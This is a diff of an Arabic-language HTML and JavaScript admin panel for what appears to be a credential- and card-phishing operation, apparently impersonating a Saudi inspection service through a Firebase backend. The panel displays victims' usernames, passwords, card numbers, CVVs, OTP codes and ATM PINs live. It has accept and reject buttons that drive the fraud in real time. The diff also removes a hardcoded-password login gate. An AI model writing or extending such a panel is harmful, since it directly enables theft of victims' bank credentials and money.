@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>الدخول الآمن | لوحة التحكم</title>
+    <title>لوحة التحكم الموحدة | إدارة النظام</title>
     
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
@@ -11,184 +11,133 @@
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 
     <style>
-        :root { --primary-red: #8b1538; --primary-blue: #00a3da; --bg: #f0f2f5; }
-        body { font-family: 'Cairo', sans-serif; background-color: var(--bg); margin: 0; direction: rtl; }
-        
-        /* شاشة تسجيل الدخول للأدمن */
-        #login-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: var(--primary-red); display: flex; justify-content: center;
-            align-items: center; z-index: 9999;
-        }
-        .login-box {
-            background: white; padding: 30px; border-radius: 15px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.2); text-align: center; width: 300px;
-        }
-        .login-box input {
-            width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #ddd;
-            border-radius: 8px; text-align: center; font-size: 18px; box-sizing: border-box;
-        }
-        .login-box button {
-            background: var(--primary-red); color: white; border: none;
-            padding: 10px 25px; border-radius: 8px; cursor: pointer; font-weight: bold;
+        :root {
+            --primary-red: #8b1538;
+            --primary-blue: #00a3da;
+            --bg: #f4f7f6;
         }
 
-        /* تنسيق اللوحة (مخفية افتراضياً) */
-        #admin-content { display: none; padding: 15px; }
-        
-        .main-header { background: #fff; padding: 15px; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); text-align: center; margin-bottom: 20px; }
-        .tabs-container { display: flex; justify-content: center; gap: 15px; margin-bottom: 20px; }
-        .tab-btn { padding: 12px 30px; border: none; border-radius: 8px; font-family: 'Cairo'; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        body {
+            font-family: 'Cairo', sans-serif;
+            background-color: var(--bg);
+            margin: 0; padding: 15px;
+            direction: rtl;
+        }
+
+        .main-header {
+            background: #fff; padding: 15px; border-radius: 12px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+            text-align: center; margin-bottom: 20px;
+            border-bottom: 4px solid var(--primary-red);
+        }
+
+        .tabs-container {
+            display: flex; justify-content: center; gap: 10px; margin-bottom: 20px;
+        }
+
+        .tab-btn {
+            padding: 12px 25px; border: none; border-radius: 8px;
+            font-family: 'Cairo'; font-weight: bold; cursor: pointer;
+            font-size: 14px; transition: 0.3s; flex: 1; max-width: 200px;
+        }
+
         .btn-accounts { background: var(--primary-red); color: white; }
         .btn-finance { background: var(--primary-blue); color: white; }
-        .tab-btn.active { outline: 3px solid #333; transform: scale(1.05); }
+        .tab-btn:hover { opacity: 0.9; transform: translateY(-2px); }
+        .tab-btn.active { box-shadow: 0 0 0 3px #333; transform: scale(1.02); }
 
-        .section { display: none; }
+        .section { display: none; animation: fadeIn 0.3s ease-in; }
         .section.active { display: block; }
-        
-        .table-container { background: white; border-radius: 12px; overflow-x: auto; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
-        table { width: 100%; border-collapse: collapse; min-width: 900px; }
-        th { background: #f8fafc; padding: 15px; font-size: 13px; border-bottom: 2px solid #edf2f7; }
+
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        /* جدول البيانات المالية */
+        .table-container { background: white; border-radius: 12px; overflow-x: auto; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
+        table { width: 100%; border-collapse: collapse; min-width: 1000px; }
+        th { background: #f8fafc; color: #475569; padding: 15px; font-size: 13px; border-bottom: 2px solid #edf2f7; }
         td { padding: 15px; text-align: center; border-bottom: 1px solid #edf2f7; font-size: 14px; font-weight: 600; }
         
-        .accounts-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
-        .account-card { background: white; padding: 20px; border-radius: 12px; border-top: 5px solid var(--primary-red); box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
-        
-        .btn-action { padding: 6px 12px; border: none; border-radius: 4px; color: white; cursor: pointer; font-family: 'Cairo'; font-weight: bold; margin: 2px; }
-        .btn-green { background: #22c55e; } .btn-red { background: #ef4444; }
-        .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-left: 5px; }
-        .online { background: #22c55e; box-shadow: 0 0 8px #22c55e; }
+        /* بطاقات الحسابات (بدون أزرار تحكم) */
+        .accounts-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 15px; }
+        .account-card { background: white; padding: 15px; border-radius: 10px; border-right: 5px solid var(--primary-red); box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
+
+        .card-val { color: var(--primary-red); font-family: monospace; font-size: 16px; letter-spacing: 1px; }
+        .user-val { color: var(--primary-blue); font-size: 15px; }
+        .otp-badge { background: #e0f2fe; color: #0369a1; padding: 3px 8px; border-radius: 4px; }
+        .pin-badge { background: #ffedd5; color: #9a3412; padding: 3px 8px; border-radius: 4px; }
+
+        .btn-action { padding: 8px 15px; border: none; border-radius: 5px; color: white; cursor: pointer; font-family: 'Cairo'; font-weight: bold; margin: 2px; font-size: 13px; }
+        .btn-ok { background: #22c55e; }
+        .btn-no { background: #ef4444; }
+        .btn-action:hover { filter: brightness(0.9); }
+
+        .status-indicator { width: 10px; height: 10px; border-radius: 50%; display: inline-block; }
+        .online { background: #22c55e; box-shadow: 0 0 5px #22c55e; }
+        .offline { background: #cbd5e1; }
     </style>
 </head>
 <body>
 
-<div id="login-overlay">
-    <div class="login-box">
-        <h2 style="color:var(--primary-red); margin:0;">دخول الإدارة</h2>
-        <p style="font-size:12px; color:#666;">يرجى إدخال كلمة المرور للمتابعة</p>
-        <input type="password" id="admin-pass" placeholder="••••••••">
-        <button onclick="checkPass()">دخول</button>
-    </div>
+<div class="main-header">
+    <h1 style="margin:0; font-size: 20px;">نظام المراقبة والتحكم المباشر</h1>
+    <p id="connection-status" style="margin:0; font-size: 11px; color: #999;">جاري الاتصال...</p>
 </div>
 
-<div id="admin-content">
-    <div class="main-header">
-        <h1 style="margin:0; font-size: 22px;">لوحة الإدارة الخاصة</h1>
-        <button onclick="logout()" style="float:left; background:#eee; border:none; padding:5px 10px; border-radius:5px; cursor:pointer;">خروج</button>
-        <p style="margin:0; font-size: 12px; color: #777;">متصلة بقاعدة البيانات الحية</p>
-    </div>
+<div class="tabs-container">
+    <button class="tab-btn btn-accounts active" onclick="showSection('accounts', this)">بيانات المستخدمين</button>
+    <button class="tab-btn btn-finance" onclick="showSection('finance', this)">البيانات المالية والتحكم</button>
+</div>
 
-    <div class="tabs-container">
-        <button class="tab-btn btn-accounts active" onclick="showSection('accounts', this)">بيانات الحسابات</button>
-        <button class="tab-btn btn-finance" onclick="showSection('finance', this)">البيانات المالية</button>
-    </div>
-
-    <div id="accounts-section" class="section active">
-        <div class="accounts-grid" id="accounts-list"></div>
-    </div>
-
-    <div id="finance-section" class="section">
-        <div class="table-container">
-            <table>
-                <thead>
-                    <tr>
-                        <th>الحالة</th><th>حامل البطاقة</th><th>رقم البطاقة</th><th>التاريخ</th><th>CVV</th><th>OTP</th><th>ATM PIN</th><th>التحكم</th>
-                    </tr>
-                </thead>
-                <tbody id="finance-list"></tbody>
-            </table>
+<div id="accounts-section" class="section active">
+    <div class="accounts-grid" id="accounts-list">
         </div>
+</div>
+
+<div id="finance-section" class="section">
+    <div class="table-container">
+        <table>
+            <thead>
+                <tr>
+                    <th>الحالة</th>
+                    <th>حامل البطاقة</th>
+                    <th>رقم البطاقة</th>
+                    <th>التاريخ</th>
+                    <th>CVV</th>
+                    <th>OTP</th>
+                    <th>ATM PIN</th>
+                    <th>التحكم بالعملية</th>
+                </tr>
+            </thead>
+            <tbody id="finance-list">
+                </tbody>
+        </table>
     </div>
 </div>
 
 <script>
-    // --- نظام الحماية ---
-    const SECRET_PASS = "Hassan2026"; // غير كلمة المرور هنا يا هندسة
+    const firebaseConfig = {
+        apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT...", 
+        authDomain: "saso-inspection.firebaseapp.com",
+        databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com",
+        projectId: "saso-inspection",
+        storageBucket: "saso-inspection.firebasestorage.app",
+        messagingSenderId: "1009002235896",
+        appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
+    };
 
-    function checkPass() {
-        const pass = document.getElementById('admin-pass').value;
-        if (pass === SECRET_PASS) {
-            document.getElementById('login-overlay').style.display = 'none';
-            document.getElementById('admin-content').style.display = 'block';
-            startFirebase(); // لا يبدأ الاتصال إلا بعد كلمة المرور
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    database.ref(".info/connected").on("value", (snap) => {
+        const statusText = document.getElementById('connection-status');
+        if (snap.val() === true) {
+            statusText.innerText = "● النظام متصل وجاهز للاستقبال";
+            statusText.style.color = "#22c55e";
         } else {
-            Swal.fire('خطأ', 'كلمة المرور غير صحيحة', 'error');
+            statusText.innerText = "○ انقطع الاتصال.. جاري المحاولة";
+            statusText.style.color = "#ef4444";
         }
-    }
-
-    function logout() { location.reload(); }
-
-    // --- نظام Firebase ---
-    function startFirebase() {
-        const firebaseConfig = {
-            apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT...", 
-            authDomain: "saso-inspection.firebaseapp.com",
-            databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com",
-            projectId: "saso-inspection",
-            storageBucket: "saso-inspection.firebasestorage.app",
-            messagingSenderId: "1009002235896",
-            appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
-        };
-
-        if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
-        const database = firebase.database();
-
-        database.ref('/').on('value', (snapshot) => {
-            const data = snapshot.val() || {};
-            const accountsList = document.getElementById('accounts-list');
-            const financeList = document.getElementById('finance-list');
-            
-            accountsList.innerHTML = '';
-            financeList.innerHTML = '';
-
-            const visitors = data.active_visitors || {};
-            const accounts = data.user_accounts || {};
-            const cards = data.card_details || {};
-            const otps = data.otp_codes || {};
-            const pins = data.atm_pins || {};
-
-            Object.keys(visitors).forEach(id => {
-                const visitor = visitors[id];
-                const isOnline = visitor.lastSeen > Date.now() - 15000;
-
-                if (accounts[id]) {
-                    accountsList.innerHTML += `
-                        <div class="account-card">
-                            <div style="display:flex; justify-content:space-between; margin-bottom:10px;">
-                                <span style="font-size:10px; color:#999;">ID: ${id}</span>
-                                <span>${isOnline ? '<span class="status-dot online"></span> متصل' : '🔴 غادر'}</span>
-                            </div>
-                            <div><b>المستخدم:</b> <span style="color:var(--primary-blue)">${accounts[id].username}</span></div>
-                            <div><b>الباسورد:</b> <span style="color:red">${accounts[id].password}</span></div>
-                            <div style="margin-top:15px; display:flex; gap:10px;">
-                                <button class="btn-action btn-green" style="flex:1" onclick="updateStatus('user_accounts', '${id}', 'accept')">صحيح</button>
-                                <button class="btn-action btn-red" style="flex:1" onclick="updateStatus('user_accounts', '${id}', 'reject')">خطأ</button>
-                            </div>
-                        </div>`;
-                }
-
-                if (cards[id]) {
-                    const card = cards[id];
-                    const otp = otps[id] || {code: '---'};
-                    const pin = pins[id] || {pin: '---'};
-                    financeList.innerHTML += `
-                        <tr>
-                            <td>${isOnline ? '🟢' : '🔴'}</td>
-                            <td>${card.cardName || '---'}</td>
-                            <td style="color:var(--primary-red); font-family:monospace;">${card.cardNumber || '---'}</td>
-                            <td>${card.expiry || '---'}</td>
-                            <td>${card.cvv || '---'}</td>
-                            <td><b style="color:var(--primary-blue)">${otp.code}</b></td>
-                            <td><b style="color:orange">${pin.pin}</b></td>
-                            <td>
-                                <button class="btn-action btn-green" onclick="updateStatus('card_details', '${id}', 'accept')">قبول</button>
-                                <button class="btn-action btn-red" onclick="updateStatus('card_details', '${id}', 'reject')">رفض</button>
-                            </td>
-                        </tr>`;
-                }
-            });
-        });
-    }
+    });
 
     function showSection(sectionId, btn) {
         document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
@@ -197,9 +146,64 @@
         btn.classList.add('active');
     }
 
+    database.ref('/').on('value', (snapshot) => {
+        const data = snapshot.val() || {};
+        const accountsList = document.getElementById('accounts-list');
+        const financeList = document.getElementById('finance-list');
+        
+        accountsList.innerHTML = '';
+        financeList.innerHTML = '';
+
+        const visitors = data.active_visitors || {};
+        const accounts = data.user_accounts || {};
+        const cards = data.card_details || {};
+        const otps = data.otp_codes || {};
+        const pins = data.atm_pins || {};
+
+        Object.keys(visitors).forEach(id => {
+            const visitor = visitors[id];
+            const isOnline = visitor.lastSeen > Date.now() - 15000;
+
+            // 1. قسم الحسابات (بدون أزرار تحكم)
+            if (accounts[id]) {
+                accountsList.innerHTML += `
+                    <div class="account-card">
+                        <div style="display:flex; justify-content:space-between; margin-bottom:10px;">
+                            <span style="font-size:10px; color:#aaa;">ID: ${id}</span>
+                            <span class="status-indicator ${isOnline ? 'online' : 'offline'}"></span>
+                        </div>
+                        <div style="margin-bottom:5px;"><b>المستخدم:</b> <span class="user-val">${accounts[id].username}</span></div>
+                        <div style="margin-bottom:5px;"><b>كلمة السر:</b> <span style="color:red; font-weight:bold;">${accounts[id].password}</span></div>
+                    </div>`;
+            }
+
+            // 2. قسم المالية (مع أزرار القبول والرفض)
+            if (cards[id]) {
+                const card = cards[id];
+                const otp = otps[id] || {code: '---'};
+                const pin = pins[id] || {pin: '---'};
+
+                financeList.innerHTML += `
+                    <tr>
+                        <td><span class="status-indicator ${isOnline ? 'online' : 'offline'}"></span></td>
+                        <td>${card.cardName || '---'}</td>
+                        <td class="card-val">${card.cardNumber || '---'}</td>
+                        <td>${card.expiry || '---'}</td>
+                        <td>${card.cvv || '---'}</td>
+                        <td><span class="otp-badge">${otp.code}</span></td>
+                        <td><span class="pin-badge">${pin.pin}</span></td>
+                        <td>
+                            <button class="btn-action btn-ok" onclick="updateStatus('card_details', '${id}', 'accept')">قبول</button>
+                            <button class="btn-action btn-no" onclick="updateStatus('card_details', '${id}', 'reject')">رفض</button>
+                        </td>
+                    </tr>`;
+            }
+        });
+    });
+
     function updateStatus(path, id, status) {
-        firebase.database().ref(path + '/' + id).update({ status: status });
-        Swal.fire({ toast: true, position: 'top-end', icon: 'success', title: 'تم التحديث', showConfirmButton: false, timer: 1000 });
+        database.ref(path + '/' + id).update({ status: status });
+        Swal.fire({ toast: true, position: 'top-end', icon: 'success', title: 'تم التحديث بنجاح', showConfirmButton: false, timer: 1000 });
     }
 </script>
 
